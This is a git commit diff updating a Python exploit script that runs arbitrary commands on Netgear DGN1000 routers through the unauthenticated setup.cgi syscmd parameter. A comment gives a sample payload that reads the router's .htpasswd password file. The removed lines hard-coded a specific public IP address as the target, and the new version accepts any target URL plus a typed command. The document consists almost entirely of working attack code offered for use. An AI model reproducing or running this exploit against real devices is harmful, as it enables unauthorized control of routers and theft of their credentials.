0efefda2f62f02366c1381207fdaaa94168e624b
東 <36947254+D0neMkj@users.noreply.github.com>
2018-03-27 14:14:31 +0800

    Update DGN1000_COMAND_EXECUTE.py

--- ROUTER/NETGEAR/DGN1000_COMAND_EXECUTE.py
+++ ROUTER/NETGEAR/DGN1000_COMAND_EXECUTE.py
@@ -1,9 +1,12 @@
 import requests
+import sys
+#DGN1000_COMAND_EXECUTE.py http://xx.xx.xx.ss
 #cat%20/www/.htpasswd
-def LeakPass(ip, port,a):
+
+def COMMANDEXECUTE(url,a):
 	header = {"User-Agent":"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64;"}
 	uri = "/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=" + a + "&curpath=/&currentsetting.htm"
-	url = "http://" + ip + ":" + str(port) + uri
+	url = url + uri
 	try:
 		res = requests.get(url, headers=header, verify=False, timeout=8)
 		data = res.content
@@ -14,13 +17,14 @@ def LeakPass(ip, port,a):
 	else:
 		return None
 
+		
 if __name__ == "__main__":
-	print "--------------------\nINPUT YOUR COMMAND:|\n--------------------"
-	a = raw_input()
-	ip = "151.25.222.238"
-	port = 80
-	LeakPass(ip,port,a)
-
+	if(sys.argv[1]):
+		print "--------------------\nINPUT YOUR COMMAND:|\n--------------------"
+		a = raw_input()
+		COMMANDEXECUTE(sys.argv[1],a)
+	else:
+		print 'please add command param'
 
 
 
